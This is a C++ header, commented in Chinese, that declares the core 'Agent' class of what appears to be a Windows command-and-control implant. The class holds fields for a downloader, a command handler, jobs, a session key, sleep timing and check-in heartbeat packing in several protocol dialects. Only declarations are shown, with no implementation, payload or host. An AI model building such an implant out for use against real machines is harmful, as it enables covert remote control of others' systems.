// 文件作用：Windows agent 主对象声明：把配置、主机信息、下载器、任务和命令处理器组合在一起。
#pragma once

#include "AgentInfo.h"
#include "AgentConfig.h"
#include "Downloader.h"
#include "JobsController.h"
#include "MemorySaver.h"
#include "Commander.h"

class Commander;
class Packer;

// Agent 是 Windows 端的核心对象，统一持有配置、主机信息、通信、任务和命令处理器。
class Agent
{
public:
	AgentInfo*      info        = NULL;
	AgentConfig*    config      = NULL;
	Commander*      commander   = NULL;
	Downloader*     downloader  = NULL;
	JobsController* jober       = NULL;
	MemorySaver*    memorysaver = NULL;

	Map<CHAR*, LPVOID> Values;

	BYTE* SessionKey = NULL;
	BOOL  Active     = TRUE;

	// 构造 Agent 并初始化所有子模块。
	Agent();

	// 判断主循环是否继续运行。
	BOOL  IsActive();
	// 计算当前轮询应该 sleep 多久。
	ULONG GetWorkingSleep();
	// 生成 check-in 心跳包。
	BYTE* BuildBeat(ULONG* size);

	// 使用自定义内存分配创建 Agent。
	static void* operator new(size_t sz);
	// 使用自定义内存释放 Agent。
	static void operator delete(void* p) noexcept;

private:
	// 生成心跳里的主机状态位图。
	BYTE BuildBeatFlags();
	// 写入 listener wrapper 兼容的外层字段：agent_type / agent_id。
	VOID PackBeatOuterHeader(Packer* packer);
	// 写入 legacy/v2 共用的固定主机字段。
	VOID PackBeatCoreFields(Packer* packer, BYTE flag);
	// 写入 legacy 心跳 dialect。
	VOID PackBeatLegacy(Packer* packer, BYTE flag);
	// 写入自研 v2 心跳 dialect。
	VOID PackBeatV2(Packer* packer, BYTE flag);
	// 写入只携带进程名的 schema5 心跳 dialect。
	VOID PackBeatV5(Packer* packer, BYTE flag);
	// 释放 AgentInfo 里只在首次 check-in 使用的字符串字段。
	VOID ReleaseBeatIdentityFields();
};
